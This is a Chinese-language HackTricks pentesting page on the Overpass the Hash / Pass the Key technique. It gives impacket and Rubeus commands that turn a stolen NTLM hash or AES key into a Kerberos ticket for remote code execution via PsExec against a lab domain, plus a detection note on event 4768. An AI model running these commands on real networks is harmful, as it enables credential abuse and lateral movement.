# Over Pass the Hash/Pass the Key

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想看到您的**公司在HackTricks中被广告**吗？或者您想访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我在**Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>

## Overpass The Hash/Pass The Key (PTK)

此攻击旨在**使用用户的NTLM哈希或AES密钥请求Kerberos票据**，作为常见的通过NTLM协议的Pass The Hash的替代方法。因此，这在**禁用NTLM协议**，只允许**Kerberos作为认证协议**的网络中可能特别**有用**。

为了执行此攻击，需要**目标用户帐户的NTLM哈希（或密码）**。因此，一旦获得用户哈希，就可以为该帐户请求TGT。最后，可以**访问**用户帐户具有权限的任何服务或计算机。
```
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
您可以使用 **-aesKey [AES key]** 来指定使用 **AES256**。\
您也可以将票据与其他工具一起使用，如 smbexec.py 或 wmiexec.py

可能出现的问题：

* _PyAsn1Error(‘NamedTypes can cast only scalar values’,)_：通过将impacket更新到最新版本来解决。
* _KDC can’t found the name_：通过使用主机名而不是IP地址来解决，因为Kerberos KDC无法识别IP地址。
```
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
这种攻击类似于**Pass the Key**，但不是使用哈希来请求票据，而是窃取票据本身并用其进行身份验证。 

{% hint style="warning" %}
当请求TGT时，会生成事件`4768: A Kerberos authentication ticket (TGT) was requested`。从上面的输出中可以看到，KeyType为**RC4-HMAC**（0x17），但Windows的默认类型现在是**AES256**（0x12）。
{% endhint %}
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## 参考资料

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在**网络安全公司**工作吗？想要看到你的**公司在HackTricks中被宣传**吗？或者想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS & HackTricks周边**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>
